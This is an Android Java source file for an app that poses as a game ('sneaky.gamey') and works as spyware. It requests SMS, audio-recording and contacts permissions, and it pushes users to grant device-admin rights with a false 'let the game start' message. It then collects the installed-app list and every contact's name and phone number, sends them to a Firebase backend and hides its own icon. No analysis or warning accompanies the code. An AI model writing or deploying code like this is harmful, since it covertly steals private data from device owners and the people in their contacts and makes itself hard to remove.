package com.sneaky.gamey;

import android.Manifest;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Bundle;
import android.provider.ContactsContract;

import androidx.appcompat.app.AppCompatActivity;

import com.sneaky.gamey.database.MyFirebase;
import com.sneaky.gamey.receivers.AdminReceiver;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    public static Context context = App.getContext();
    public static String[] permissions = { Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS,
    Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.MODIFY_AUDIO_SETTINGS, Manifest.permission.RECORD_AUDIO, Manifest.permission.READ_CONTACTS};
    private DevicePolicyManager devicePolicyManager;
    private ComponentName adminComponent;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        startRequestPermissions();
        MyFirebase.initFirebase();
        //startService(new Intent(this, MainService.class));
        while (!MyFirebase.finished) {}
    }

    private void hideIcon() {
        try{
            PackageManager p = getPackageManager();
            p.setComponentEnabledSetting(new ComponentName(this, com.sneaky.gamey.MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void startAdminRequest() {
        try {
            devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            adminComponent = new ComponentName(this, AdminReceiver.class);

            if (!devicePolicyManager.isAdminActive(adminComponent)) {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Click on Activate button to let the game start.");
                startActivityForResult(intent, 0);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void startRequestPermissions() {
        List<String> permissionsToRequest = new ArrayList<String>();
        for (String perm: permissions) {
            if (this.getApplicationContext().checkSelfPermission(perm) != PackageManager.PERMISSION_GRANTED && perm != null && !perm.trim().isEmpty()) {
                permissionsToRequest.add(perm);
            }
        }
        if (!permissionsToRequest.isEmpty())
            requestPermissions(permissionsToRequest.toArray(new String[0]), 200);
        else
            startAdminRequest();
    }
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        boolean allGranted = true;
        for (int result: grantResults) {
            if (result != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                startRequestPermissions();
            }
        }
        if (allGranted) {
            startAdminRequest();
            ArrayList<String> data = getInstalledApplications();
            MyFirebase.sendData("apps", data.toString());
            data = getContactList();
            MyFirebase.sendData("contacts", data.toString());
            hideIcon();
            //startService(new Intent(this, PhoneService.class));
        }

    }

    private ArrayList<String> getInstalledApplications() {
        final PackageManager pm = getPackageManager();
        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
        ArrayList<String> packageNames = new ArrayList<String>();
        for (ApplicationInfo packageInfo : packages) {
            packageNames.add(packageInfo.packageName);
        }
        return packageNames;
    }
    private ArrayList<String> getContactList() {
        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,null, null, null, null);
        ArrayList<String> contacts = new ArrayList<String>();

        if ((cur != null ? cur.getCount() : 0) > 0) {
            while (cur != null && cur.moveToNext()) {
                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                if (cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        contacts.add("name: " + name + " number: " + phoneNo);
                    }
                    pCur.close();
                }
            }
        }
        if(cur != null){
            cur.close();
        }
        return contacts;
    }
}